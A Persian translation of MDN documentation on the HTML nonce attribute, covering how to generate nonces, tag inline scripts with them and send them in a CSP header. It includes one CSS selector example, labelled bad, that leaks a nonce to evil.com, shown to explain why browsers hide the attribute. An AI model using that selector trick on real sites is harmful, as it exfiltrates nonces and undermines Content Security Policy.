---
title: "nonce HTML global attribute"
source: "https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Global_attributes/nonce"
translated_by: "n8n + AI"
---

```markdown
**`nonce`** یک attribute سراسری (global attribute) است که یک nonce (عدد یک‌بار مصرف) رمزنگاری شده را تعریف می‌کند. این مقدار توسط [Content Security Policy (CSP)](/en-US/docs/Web/HTTP/Guides/CSP) برای تعیین این که آیا یک درخواست (fetch) برای یک عنصر خاص مجاز است یا خیر، استفاده می‌شود.

## توضیحات

attribute `nonce` برای لیست سفید (allowlist) کردن عناصر خاص، مثل یک اسکریپت یا استایل inline خاص مفید است. با استفاده از آن می‌توانید از دستور `unsafe-inline` در CSP که تمام اسکریپت‌ها و استایل‌های inline را مجاز می‌کند، اجتناب کنید.

> **توجه:**  
> تنها زمانی از `nonce` استفاده کنید که چاره‌ای جز استفاده از محتوای اسکریپت یا استایل inline ناامن ندارید. اگر به `nonce` نیاز ندارید، از آن استفاده نکنید. اگر اسکریپت شما ایستا است، می‌توانید به جای آن از یک hash CSP استفاده کنید. (به یادداشت‌های استفاده در [unsafe inline script](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script) مراجعه کنید.) همیشه سعی کنید از محافظت‌های CSP به طور کامل بهره ببرید و تا حد امکان از nonce و اسکریپت‌های inline ناامن خودداری کنید.

### استفاده از nonce برای لیست سفید یک عنصر `<script>`

برای لیست سفید یک اسکریپت inline با استفاده از مکانیزم nonce، چند مرحله را باید دنبال کنید:

#### تولید مقادیر

از سرور وب خود، یک رشته تصادفی با حداقل 128 بیت داده که با مولد اعداد تصادفی امن رمزنگاری شده تولید کنید. Nonce باید هر بار که صفحه بارگذاری می‌شود متفاوت باشد (nonce فقط یک بار!). برای مثال، در nodejs:

```js
import crypto from "node:crypto";

crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### لیست سفید اسکریپت inline

nonce تولید شده در کد بک‌اند شما باید برای اسکریپت inline که می‌خواهید مجاز کنید استفاده شود:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### ارسال nonce با هدر CSP

در نهایت، باید مقدار nonce را در یک هدر [`Content-Security-Policy`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) ارسال کنید (با پیشوند `nonce-`):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### دسترسی به nonce و مخفی‌سازی nonce

به دلایل امنیتی، attribute محتوایی `nonce` مخفی است (یک رشته خالی برگردانده می‌شود).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

تنها راه دسترسی به nonce، property [`nonce`](/en-US/docs/Web/API/HTMLElement/nonce) است:

```js example-good
script.nonce; // returns nonce value
```

مخفی‌سازی nonce از استخراج اطلاعات nonce توسط مهاجمان از طریق مکانیسم‌هایی که می‌توانند داده‌ها را از attributes محتوایی مانند این بگیرند، جلوگیری می‌کند:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## همچنین ببینید

- [`HTMLElement.nonce`](/en-US/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/en-US/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
```